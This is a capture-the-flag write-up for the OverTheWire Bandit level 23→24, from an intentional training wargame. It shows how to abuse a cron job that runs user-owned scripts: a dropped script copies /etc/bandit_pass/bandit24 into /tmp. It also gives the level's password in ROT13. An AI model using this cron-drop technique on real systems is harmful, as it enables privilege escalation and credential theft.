# Write-up: Bandit 23 → 24
**Date:** 2025-08-15

## Obfuscated password (ROT13) 
`to8XEEPffuhMKV0gHhE6lcBSwvMos3T8`

## OBJECTIVE
> "A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
>
> NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
>
> NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…"

## PURPOSE

We need to go back once more to `/etc/cron.d` and `cat` **`cronjob_bandit24`** to find the script `/usr/bin/cronjob_bandit24.sh`, which contains the following:

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

We can deduce that the script will execute and then delete all scripts **owned by bandit23** in `/var/spool/bandit24/foo`. Here is where we can create our script, then. To confirm, we can run `ls -l /var/spool/bandit24`:
```
drwxrwx-wx 8 root bandit24 4096 Aug 15 23:21 foo
```
As we are in the *others* class, we have **write** and **execute** permissions on `foo`, but no **read** permission. All we need to do then is write a script that will copy the next password to a location we *can* read, namely a `/tmp` file, and it will be **executed** by the cron job.

`cat > /var/spool/bandit24/foo/mydrop` will bring us into interactive mode where we can write our script, then press **Ctrl+D** to save:
```
#!/bin/bash
/bin/cat /etc/bandit_pass/bandit24 > /tmp/mybandit24pass
```
Now make the script executable (required so cron can run it):
```
chmod 755 /var/spool/bandit24/foo/mydrop
```
After about a minute (cron runs every minute), read the password:
```
cat /tmp/mybandit24pass
```

## SOLUTIONS
- `cat /etc/cron.d/cronjob_bandit24`
- `cat /usr/bin/cronjob_bandit24.sh`
- `cat > /var/spool/bandit24/foo/mydrop` *(paste the two lines above, then Ctrl+D)*
- `chmod 755 /var/spool/bandit24/foo/mydrop`
- `cat /tmp/mybandit24pass`

---

Writeup author: **Jeremy Ray Jewell**  
[GitHub](https://github.com/jeremyrayjewell) • [LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
